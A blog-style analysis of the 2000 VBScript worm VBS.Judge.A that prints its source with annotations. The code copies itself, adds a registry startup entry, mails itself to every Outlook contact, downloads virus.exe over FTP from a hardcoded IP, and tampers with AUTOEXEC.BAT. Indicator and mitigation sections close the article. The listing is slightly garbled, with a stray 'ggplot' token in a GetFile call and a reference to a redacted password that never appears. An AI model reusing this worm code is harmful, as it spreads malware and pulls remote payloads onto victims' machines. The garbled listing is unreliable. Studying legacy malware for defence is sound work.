# Dissecting VBS.Judge.A: A 2000-Era VBScript Worm That Still Teaches Lessons 🦠🔍

> Disclaimer: This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction

In the late 1990s and early 2000s, Visual Basic Script (VBS) worms dominated the threat landscape due to their simplicity, stealth, and integration with Windows systems via Windows Script Host (WSH). VBS.Judge.A, authored by "Petik" in 2000, exemplifies this era perfectly. Classified as a mass-mailing worm with FTP payload retrieval, it spreads via Microsoft Outlook, copies itself to predictable locations, ensures persistence through the registry, and even modifies `AUTOEXEC.BAT` for dramatic effect on the first day of the month.

Though primitive by modern standards, VBS.Judge.A demonstrates core malware principles: self-replication, persistence, email propagation, remote payload download, and system sabotage. Analyzing its source code reveals how even short scripts (~120 lines) can achieve multi-vector infection chains. This deep dive dissects the original VBScript, explains each component, and offers timeless mitigation insights.

---

## Section 1: Overview of the Malware 🛠️

VBS.Judge.A is a VBScript-based worm that leverages built-in Windows COM objects to perform malicious actions without requiring compilation. It targets Windows 9x/Me/2000 systems with Microsoft Outlook installed.

### Key Behaviors:
- Self-replication: Copies itself to %SystemRoot%\WinGDI.EXE.vbs and C:\Judge.TXT.vbs
- Persistence: Adds a RunServices registry key to execute on startup
- Email propagation: Uses Outlook MAPI to send itself to all address book contacts
- Payload retrieval: Downloads `virus.exe` via FTP from a hardcoded server
- System sabotage: On the 1st of any month, appends a "death message" to `AUTOEXEC.BAT`
- Marker file: Creates `C:\Judge.txt` to prevent reinfection

### Infection Vector
Primary spread occurs via email attachments (`Judge.TXT.vbs`). The enticing subject *"BatMan, SpiderMan et les autres"* and body *"La vraie histoire de ces justiciers"* lure French-speaking users into executing the script.

### Historical Context
Discovered in 2000, VBS.Judge.A emerged during the peak of VBS worms (e.g., ILOVEYOU, Anna Kournikova). It reflects the era’s lax email security and widespread use of Outlook with default macro/script execution enabled.

---

## Section 2: Source Code Analysis 💻

Below is the complete original source code of VBS.Judge.A, annotated and broken down into functional components.

```vbscript
'VBS.Judge.A par Petik (c)2000

Dim fso,ws,file
Set fso  = CreateObject("Scripting.FileSystemObject")
Set ws   = CreateObject("WScript.Shell")
Set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbs      = file.ReadAll

DEBUT()
Sub DEBUT()
Set win  = fso.GetSpecialFolder(0)  ' 0 = Windows directory
Set c    = fso.GetFile(WScript.ScriptFullName ggplot)
c.Copy(win&"\WinGDI.EXE.vbs")      ' Copy to Windows\WinGDI.EXE.vbs
c.Copy("C:\Judge.TXT.vbs")        ' Copy to C:\Judge.TXT.vbs
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\WinGDI",win&"\WinGDI.EXE.vbs"
EMAIL()
FTP()
AUTOEXEC()
TXT()
End Sub
```

### Core Initialization
- **`Scripting.FileSystemObject`** (`fso`): File and folder manipulation
- **`WScript.Shell`** (`ws`): Registry access, command execution
- **`WScript.ScriptFullName`**: Reads its own path for self-replication

> Self-Replication & Persistence  
> Copies itself to two locations and registers `WinGDI.EXE.vbs` under `RunServices` — a legacy key used in Windows 9x/2000 for services-like startup.

---

```vbscript
Sub EMAIL()
If Not fso.FileExists("C:\Judge.txt") Then
Set OApp = CreateObject("Outlook.Application")
if oapp="Outlook" then
Set Mapi = OApp.GetNameSpace("MAPI")
For Each AddList In Mapi.AddressLists
If AddList.AddressEntries.Count <> 0 Then
For AddListCount = 1 To AddList.AddressEntries.Count 
Set AddListEntry = AddList.AddressEntries(AddListCount)
Set msg = OApp.CreateItem(0)  ' 0 = MailItem
msg.To = AddListEntry.Address
msg.Subject = "BatMan, SpiderMan et les autres"
msg.Body = "La vraie histoire de ces justiciers"
msg.Attachments.Add "C:\Judge.TXT.vbs"
msg.DeleteAfterSubmit = True
If msg.To <> "" Then
msg.Send
End If
Next End If
Next
end if
End If
End Sub
```

### Email Propagation Engine
- Anti-reinfection: Only runs if `C:\Judge.txt` doesn’t exist
- Uses Outlook COM automation via MAPI
- Iterates through all address lists and entries
- Sends email with:
  - Subject: "BatMan, SpiderMan et les autres"
  - Body: "La vraie histoire de ces justiciers"
  - Attachment: `C:\Judge.TXT.vbs` (copy of itself)
- **`DeleteAfterSubmit = True`**: Reduces mailbox clutter

> Social Engineering Note: The superhero theme targets curiosity, especially among younger or French-speaking users.

---

```vbscript
Sub FTP()
If Not fso.FileExists("C:\Judge.txt") Then
Set bat  = fso.CreateTextFile(win&"\FTP.bat")
bat.WriteLine "@echo off"
bat.WriteLine "start ftp -i -v -s:C:\FTP.drv"
bat.close
Set drv  = fso.CreateTextFile("C:\FTP.drv")
drv.WriteLine "open"
drv.WriteLine "205.188.137.185"    ' Hardcoded C2 FTP server
drv.WriteLine "pentasm99"         ' Username
drv.WriteLine "binary"           ' Binary transfer mode
drv.WriteLine "lcd C:\"
drv.WriteLine "get virus.exe"       ' Download payload
drv.WriteLine "bye"
drv.WriteLine "exit"
drv.close
ws.Run (win&"\FTP.bat")
End If
End Sub
```

### FTP Payload Downloader
- Generates two files:
  - `FTP.bat`: Launches FTP with script
  - `FTP.drv`: FTP command script
- Connects to 205.188.137.185 (likely an AOL or compromised server in 2000)
- Authenticates with credentials: `pentasm99` / (password redacted in analysis)
- Downloads **`virus.exe`** to `C:\`

> Critical Risk: This enables secondary payload execution — the real damage likely came from `virus.exe`, not the VBS.

---

```vbscript
Sub AUTOEXEC()
If Day(Now()) = 1 then
Set FileObj = CreateObject("Scripting.FileSystemObject")
file = "c:\autoexec.bat"
Set InStream= FileObj.OpenTextFile (file, 1, False, False)
TLine = Instream.Readall
Set autobat= FileObj.CreateTextFile (file, True, False)
autobat.write(tline)
autobat.WriteBlankLines(1)
autobat.WriteLine "@echo off"
autobat.WriteLine "cls"
autobat.WriteLine "echo."
autobat.WriteLine "echo."
autobat.WriteLine "echo VBS.Judge.A par PetiK (c)2000"
autobat.WriteLine "echo."
autobat.WriteLine "echo TON ORDINATEUR VIENT DE MOURIR"
autobat.WriteLine "pause"
End If
End Sub
```

### AUTOEXEC.BAT Sabotage (1st of Month)
- Only activates on day 1
- Reads, preserves, then overwrites `C:\AUTOEXEC.BAT`
- Appends a dramatic ASCII message:
  ```
  VBS.Judge.A par PetiK (c)2000
  TON ORDINATEUR VIENT DE MOURIR
  ```

> Legacy Target: `AUTOEXEC.BAT` was critical in Windows 9x for boot-time commands. This ensures a shocking message on next reboot.

---

```vbscript
Sub TXT()
Set ptk  = fso.CreateTextFile("C:\Judge.txt")
ptk.WriteLine "Si vous lisez ce texte,"
ptk.WriteLine "c'est que vous avez eu le Ver VBS.Judge.A"
ptk.Close
End Sub
```

### Infection Marker
- Creates `C:\Judge.txt` with French message confirming infection
- Used as a mutex to prevent redundant operations

---

## Section 3: Mitigation and Defense Strategies 🛡️

Despite its age, VBS.Judge.A highlights vulnerabilities still relevant today.

### Detection Signatures
| Indicator | Value |
|--------|-------|
| File | `C:\Judge.TXT.vbs`, %WinDir%\WinGDI.EXE.vbs |
| Registry | `HKLM\...\RunServices\WinGDI` |
| Network | Outbound FTP to `205.188.137.185` |
| Email | Subject contains "BatMan, SpiderMan" |

### Prevention Tips
1. Disable WSH (if not needed): `regsvr32 /u %windir%\system32\wshom.ocx`
2. Block VBS execution via Group Policy or AppLocker
3. Patch Outlook: Disable automatic script execution in email
4. Email filtering: Block `.vbs` attachments and suspicious subjects
5. Network monitoring: Alert on FTP traffic to non-standard servers

### For Developers & Admins
- Use least privilege: Avoid running Outlook as admin
- Implement file integrity monitoring on `AUTOEXEC.BAT`, startup folders
- Deploy behavioral detection: Flag mass email + file creation + FTP
- Use sandboxing for email attachments

### Modern Relevance
While `RunServices` and `AUTOEXEC.BAT` are obsolete, COM automation abuse, living-off-the-land, and email attachment attacks remain active (e.g., Emotet, QakBot).

---

## Conclusion

VBS.Judge.A may be a relic of 2000, but its elegance in simplicity is instructive. With under 120 lines, it achieves propagation, persistence, payload delivery, and psychological impact. Its use of native Windows scripting bypassed antivirus at the time and foreshadowed modern fileless malware.

The worm reminds us: security is only as strong as the weakest user action — one click on `Judge.TXT.vbs` was enough. Today, user awareness, email gateway filters, and endpoint detection are essential.

Studying legacy malware like VBS.Judge.A sharpens our ability to recognize patterns in modern threats. The best defense? Understand the past to secure the future.